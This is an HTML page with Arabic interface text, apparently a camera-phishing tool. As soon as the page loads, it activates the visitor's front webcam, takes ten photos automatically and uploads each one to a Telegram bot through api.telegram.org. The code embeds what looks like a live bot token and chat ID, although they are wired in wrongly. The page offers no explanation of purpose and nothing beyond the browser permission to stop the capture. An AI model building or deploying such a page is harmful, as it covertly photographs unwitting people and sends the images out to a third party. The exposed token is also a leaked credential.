<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>نظام التلقاط التلقائي</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(45deg, #1a1a1a, #2c3e50);
            color: white;
            min-height: 100vh;
        }
        .camera-container {
            width: 100%;
            max-width: 600px;
            margin: 2rem auto;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
        }
        #my_camera {
            width: 100%;
            height: 450px;
            background: #333;
        }
        .loading {
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            height: 450px;
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.26/webcam.min.js"></script>
</head>
<body>
    <div class="container">
        <h1 class="text-center py-4">نظام التلقاط التلقائي</h1>
        
        <div class="camera-container">
            <div id="my_camera">
                <div class="loading">جارٍ تحميل الكاميرا...</div>
            </div>
        </div>

        <div id="status" class="text-center mt-4 fs-5"></div>
    </div>

    <script>
        const totalImages = 10;
        let imagesArray = [];
        
        // تهيئة الكاميرا مع التأكد من التحميل
        function initializeCamera() {
            Webcam.set({
                width: 600,
                height: 450,
                image_format: 'jpeg',
                jpeg_quality: 90,
                facingMode: "user"
            });

            Webcam.attach('#my_camera', function() {
                document.querySelector('.loading').style.display = 'none';
                setTimeout(startAutoCapture, 1500); // تأخير بسيط لضمان الاستقرار
            }, function(error) {
                document.getElementById('status').innerHTML = 'خطأ في تحميل الكاميرا!';
                console.error(error);
            });
        }

        // بدء الالتقاط التلقائي
        async function startAutoCapture() {
            document.getElementById('status').innerHTML = 'جارٍ الالتقاط التلقائي...';
            
            for(let i = 0; i < totalImages; i++) {
                await new Promise(resolve => setTimeout(resolve, 1000));
                await takeSnapshot();
                updateStatus(i + 1);
            }
            
            await sendToTelegram();
        }

        function takeSnapshot() {
            return new Promise((resolve) => {
                Webcam.snap((data_uri) => {
                    imagesArray.push(data_uri);
                    resolve();
                });
            });
        }

        function updateStatus(current) {
            document.getElementById('status').innerHTML = 
                `تم تغفيل ${current} من ${totalImages} صور`;
        }

        async function sendToTelegram() {
            document.getElementById('status').innerHTML = 'جارٍ الإرسال إلى التليجرام...';
            
            try {
                for(const img of imagesArray) {
                    const blob = await fetch(img).then(res => res.blob());
                    const formData = new FormData();
                    formData.append('7828957324', '8031350603:AAEfbiBpNACqXmOsP4XLRz-MbexsfQgKw98');
                    formData.append('photo', blob, 'image.jpg');
                    
                    await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto', {
                        method: 'POST',
                        body: formData
                    });
                }
                
                document.getElementById('status').innerHTML = 'تم الإرسال بنجاح!';
                imagesArray = [];
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('status').innerHTML = 'حدث خطأ في الإرسال!';
            }
        }

        // بدء التشغيل عند تحميل الصفحة
        window.onload = initializeCamera;
    </script>
</body>
</html>
